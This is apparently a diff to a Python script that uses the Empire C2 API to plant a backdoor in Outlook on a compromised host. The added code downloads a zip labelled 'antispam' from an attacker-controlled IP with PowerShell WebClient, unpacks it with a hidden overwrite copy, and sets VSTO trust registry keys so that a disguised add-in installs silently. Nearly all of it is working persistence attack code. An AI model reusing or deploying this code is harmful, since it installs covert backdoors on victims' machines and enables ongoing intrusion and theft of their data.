@@ -8,7 +8,7 @@ Backdoor requirements:
 from EmpireAPIWrapper import empireAPI
 from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
 
-def run(API, agent_name):
+def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antispam.zip'):
     # check for Outlook version
     findOutlook = """Get-ChildItem 'HKCU:\\SOFTWARE\\Microsoft\\Office'"""
     opts = {'Agent': agent_name, 'command': findOutlook}    
@@ -40,7 +40,7 @@ def run(API, agent_name):
     # add registry settings for silent VSTO install
     vsto_reg_add = r"""New-Item 'HKCU:\Software\Microsoft\VSTO\Security\Inclusion\97618ff9-cf79-4ce2-b530-43e570019f67' -Force |
                        New-ItemProperty -Name PublicKey -Value '<RSAKeyValue><Modulus>1uL5d9QfFi4PfJpvvtUHXu6sROwLlO/kMQtYC3z3JpEneqAlyu7Dd+c4akI7xre5X2jMBI5D+hVWxrEiqPBnN8meKW2U59DTLPS6ZTBPYfdGxR65gY8AD8uGjlNfafm3niHL1yivC7zs1rz2W2z+aR7fmB0pNMe45k3uC2UWQo0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>' |
-                       New-ItemProperty -Name Url -Value 'file:///REPLACEME/antispam/OutlookAddIn1.vsto'
+                       New-ItemProperty -Name Url -Value 'file:///REPLACEME/Apps/antispam/AntiSpam.vsto'
                     """
     vsto_reg_add = vsto_reg_add.replace('REPLACEME',uploadpath.replace('\\','/'))
     opts['command'] = vsto_reg_add
@@ -48,11 +48,19 @@ def run(API, agent_name):
     if("PSPath" not in results):
         raise ValueError('Fail to add VSTO registry for silent install')
 
-    # todo2 download VSTO zip file to LOCALAPPDATA 
-    # todo3 unzip VSTO file
+    # download VSTO zip file to LOCALAPPDATA
+    outfile = uploadpath + '\\Apps\\antispam.zip'
+    opts['command'] = "(New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')".format(vsto_zip_backdoor_url, outfile)
+    API.agent_run_shell_cmd_with_result(agent_name, opts)
 
-    # VSTOinstaller silent install
-    opts['command'] = '& "' + VSTOinstallerpath + '" /s /i "' + uploadpath + '\\antispam\\OutlookAddIn1.vsto"'
+    # unzip VSTO file; tried ClickOnce deployment over HTTP, refuse to work deal to trust issues
+    opts['command'] = "$zipfile = (new-object -com shell.application).NameSpace('{0}')\n \
+                    $destination = (new-object -com shell.application).NameSpace('{1}')\n \
+                    $destination.CopyHere($zipfile.Items(), 0x14)".format(outfile, outfile.replace('\\antispam.zip',''))
+    API.agent_run_shell_cmd_with_result(agent_name, opts) # 0x14 for overwrite & hidden copy
+    
+    # VSTOinstaller silent install.
+    opts['command'] = '& "' + VSTOinstallerpath + '" /s /i "' + uploadpath + '\\Apps\\antispam\\AntiSpam.vsto"'
     API.agent_run_shell_cmd_with_result(agent_name, opts)
     return results
     
